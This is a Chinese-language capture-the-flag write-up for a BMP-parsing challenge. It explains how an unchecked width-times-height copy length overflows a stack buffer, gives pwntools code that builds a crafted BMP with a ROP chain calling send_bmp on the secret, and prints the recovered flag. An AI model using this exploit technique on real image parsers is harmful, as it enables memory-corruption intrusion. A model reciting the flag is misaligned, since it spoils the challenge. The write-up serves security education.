# BMP

## 题目简述

程序读取最多 `0xb80` 字节的 1-bpp BMP，解析固定大小的文件头、信息头和调色板，再把像素数据复制到栈上的 `bmp_t`。目标程序为 x86-64、无 PIE、无栈 Canary、NX 开启。漏洞在于未压缩 BMP 的像素长度完全由未校验的 `biWidth * biHeight * biBitCount / 8` 决定，可以越过 `data[0xb00]` 覆盖返回地址；全局符号 `FLAG` 则预先装载了秘密 BMP。

## 解题过程

### 构造能通过检查的超长未压缩 BMP

文件头要求：`bfSize` 等于实际输入长度，数据偏移固定为 `0x3e`。信息头要求 `biSize=40`、`biPlanes=1`、`biBitCount=1`、`biClrUsed=2`。

问题出在校验只对压缩图检查 `biSizeImage` 上界：

```c
if (image->biCompression != UNCOMPRESSED) {
    if (image->biSizeImage > (MAX_DATA - DATA_OFFSET))
        DIE();
}
```

当 `biCompression=0` 时，`load_data` 改用宽高计算复制量，但不验证它是否超过 `data[0xb00]`：

```c
pixel_data_input =
    (biHeight * biWidth * biBitCount) / 8;
memcpy(&data->data, input + bfOffBits, pixel_data_input);
```

令高度为 1、位深为 1、宽度为像素 payload 字节数的 8 倍，就能让复制长度精确等于 payload 长度。官方 exploit 测得从像素区起点到保存的 RIP 偏移为 `0xb2a`，因此构造：

```python
from pwn import *

METADATA_SIZE = 0x3E
RIP_OFFSET = 0xB2A

def build_bmp(pixel_data):
    file_header = p16(0x4D42)
    file_header += p32(METADATA_SIZE + len(pixel_data))
    file_header += p16(0) + p16(0)
    file_header += p32(METADATA_SIZE)

    image_header = p32(40)
    image_header += p32(len(pixel_data) * 8)  # width
    image_header += p32(1)                    # height
    image_header += p16(1) + p16(1)           # planes, bpp
    image_header += p32(0)                    # uncompressed
    image_header += p32(len(pixel_data))
    image_header += p32(0) + p32(0)
    image_header += p32(2) + p32(2)

    palette = p32(0x00000000) + p32(0xFFFFFFFF)
    return file_header + image_header + palette + pixel_data
```

### ROP 调用 `send_bmp(&FLAG)`

无 PIE 使 gadget、`FLAG` 和 `send_bmp` 地址固定。覆盖返回地址为：

```python
pop_rdi = 0x401936
flag_bmp = elf.sym["FLAG"]
send_bmp = elf.sym["send_bmp"]

pixel_data = flat(
    b"A" * RIP_OFFSET,
    pop_rdi,
    flag_bmp,
    send_bmp,
)
payload = build_bmp(pixel_data)
assert len(payload) == 0xB80
```

程序先正常回显攻击者 BMP 并打印一次 `[*] Raw BMP`；ROP 再调用 `send_bmp(&FLAG)`，会打印第二次标记并按秘密 BMP 自身的 `bfSize` 输出完整文件。同步到第二次标记后保存剩余二进制数据即可。

恢复出的秘密 BMP 只是白底黑字结果，主体为 `gG_f0r_Y0u3_f1rsT_O_cLiK`，没有额外的空间、颜色或载体结构需要依赖图片判断，因此直接转写文字。按比赛标准包装得到：

```text
shellmates{gG_f0r_Y0u3_f1rsT_O_cLiK}
```

## 方法总结

- 核心技巧：利用未压缩 BMP 宽高计算的整数长度绕过 `biSizeImage` 上界，把像素复制变成栈溢出，再 ROP 调用现成文件发送函数。
- 识别信号：解析器对压缩与未压缩分支使用不同长度来源，且只校验其中一个分支时，应沿实际 `memcpy` 长度检查边界。
- 复用要点：BMP 元数据必须同时满足固定偏移和实际总长；服务会先回显攻击文件，接收端要同步第二次输出标记，避免把两份 BMP 混在一起。
